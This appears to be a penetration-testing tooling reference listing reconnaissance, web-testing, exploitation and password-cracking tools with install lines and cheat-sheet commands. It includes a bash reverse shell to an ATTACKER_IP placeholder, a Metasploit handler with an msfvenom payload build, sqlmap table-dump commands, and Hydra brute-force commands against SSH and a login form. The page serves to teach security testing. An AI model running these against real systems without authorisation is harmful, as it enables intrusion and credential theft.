    Tooling Reference¶

    Tools are multipliers. A tool without understanding multiplies incompetence. A tool with understanding multiplies capability.

    All tools listed here are free unless marked [Paid] or [Freemium].

    Reconnaissance¶

    Tool Purpose Install
    nmap Port scanning, service detection, NSE scripting apt install nmap
    Masscan Ultra-fast port scanner (internet-scale) apt install masscan
    Shodan [Freemium] Internet-wide device search engine Web + CLI: pip install shodan
    subfinder Passive subdomain enumeration go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
    amass Deep subdomain enumeration + mapping apt install amass
    theHarvester OSINT: emails, subdomains, IPs Built into Kali
    Maltego [Freemium] Link analysis and OSINT visualization maltego.com
    recon-ng Web reconnaisance framework Built into Kali
    SpiderFoot Automated OSINT collection pip install spiderfoot 
    # nmap cheatsheet
nmap -sn 192.168.1.0/24          # Host discovery (no port scan)
nmap -sV -sC -O target           # Version, scripts, OS
nmap -p- --min-rate 5000 target  # All ports, faster
nmap -A target                   # Aggressive (sV + sC + O + traceroute)
nmap --script vuln target        # Run all vuln detection scripts

    Web Application Testing¶

    Tool Purpose Install
    Burp Suite Community HTTP proxy, scanner, intruder, repeater portswigger.net
    OWASP ZAP Open source web scanner apt install zaproxy
    ffuf Fast fuzzer — directories, subdomains, parameters apt install ffuf
    gobuster Directory/DNS/vhost bruteforce apt install gobuster
    Nikto Web server vulnerability scanner apt install nikto
    SQLmap Automated SQL injection apt install sqlmap
    nuclei Template-based vulnerability scanner go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
    WhatWeb Web technology fingerprinting apt install whatweb
    Wappalyzer Browser ext: tech fingerprinting Browser extension 
    # Directory bruteforce with ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Subdomain enumeration with ffuf
ffuf -u https://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com" -mc 200

# SQLmap — automated injection
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump

    Wordlists: SecLists — install: apt install seclists or clone to /usr/share/seclists/

    Exploitation & Post-Exploitation¶

    Tool Purpose Install
    Metasploit Exploitation framework apt install metasploit-framework
    msfvenom Payload generation (part of Metasploit) Included
    Netcat (nc) Swiss army knife — shells, port relay apt install netcat-openbsd
    pwncat Advanced reverse shell handler pip install pwncat-cs
    Impacket Windows/AD protocols — PTH, SMB, Kerberos pip install impacket
    CrackMapExec / NetExec Windows network pentesting pip install netexec
    BloodHound Active Directory attack path mapping GitHub releases
    Mimikatz Windows credential extraction GitHub (run on target)
    Evil-WinRM Windows Remote Management shell gem install evil-winrm 
    # Metasploit workflow
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
run

# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe

# Netcat reverse shell
# Attacker (listener):
nc -lvnp 4444
# Victim (Linux):
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

    Password & Credential Attacks¶

    Tool Purpose Install
    Hashcat GPU-accelerated password cracking apt install hashcat
    John the Ripper Password cracking (CPU-based) apt install john
    Hydra Online brute-force (SSH, FTP, HTTP) apt install hydra
    CeWL Custom wordlist generator from website apt install cewl
    crunch Generate wordlists by pattern apt install crunch 
    # Hashcat - identify hash type first: https://hashes.com/en/tools/hash_identifier
# MD5
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# NTLM
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt
# bcrypt
hashcat -a 0 -m 3200 bcrypt.txt rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=NT hash.txt  # Specify format

# Hydra - SSH bruteforce
hydra -l admin -P rockyou.txt ssh://target.com
hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

    Wordlists: - rockyou.txt — gunzip /usr/share/wordlists/rockyou.txt.gz - SecLists — comprehensive collections
